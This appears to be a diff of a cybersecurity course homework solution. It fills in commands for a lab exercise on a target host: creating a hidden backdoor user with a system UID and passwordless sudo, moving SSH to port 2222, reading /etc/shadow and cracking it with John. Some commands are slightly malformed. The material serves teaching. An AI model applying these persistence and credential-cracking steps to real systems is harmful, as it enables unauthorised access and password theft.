@@ -8,63 +8,78 @@ Save and submit the completed file for your homework submission.
 
 1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
 
-        hello world
-
-
-![pic](image/nameit.png)
+        sudo adduser sysd
 
 
 
 2. Give your secret user a password: 
-    - `Your solution command here`
 
+
+        sudo passwd sysd 
 3. Give your secret user a system UID < 1000:
-    - `Your solution command here`
+
+
+        sudo usermod -u 150 sysd
 
 4. Give your secret user the same GID:
-   - `Your solution command here`
 
+
+        sudo usermod -g 150 sysd
+
+       
 5. Give your secret user full `sudo` access without the need for a password:
-   -  `Your solution command here`
+
+
+
+         sudo visudo
+        in nano: sysd ALL=(ALL:ALL) NO PASSWD:ALL
+      
 
 6. Test that `sudo` access works without your password:
 
-    ```bash
-    Your bash commands here
-    ```
+    
 
+              sudo cat /etc/shadow
 **Step 2: Smooth Sailing**
 
 1. Edit the `sshd_config` file:
 
-    ```bash
-    Your bash commands here
-    ```
+        nano /etc/ssh/sshd_config
+
+![pic](image/Nano.png)
+
 
 **Step 3: Testing Your Configuration Update**
 1. Restart the SSH service:
-    - `Your solution command here`
+
+
+        service ssh restart
 
 2. Exit the `root` account:
-    - `Your solution command here`
+
+        exit
 
 3. SSH to the target machine using your `sysd` account and port `2222`:
-    - `Your solution command here`
+    
+            ssh sysd@192.168.6.105 -p 2222
 
 4. Use `sudo` to switch to the root user:
-    - `Your solution command here`
+
+         sudo -s
 
 **Step 4: Crack All the Passwords**
 
 1. SSH back to the system using your `sysd` account and port `2222`:
 
-    - `Your solution command here`
+
+        ssh sysd@192.168.6.105 -p 2222
+        
 
 2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
 
-    - `Your solution command here`
+        john /etc/shadow
 
----
 
+![pic](image/passwords.png)
 © 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
 
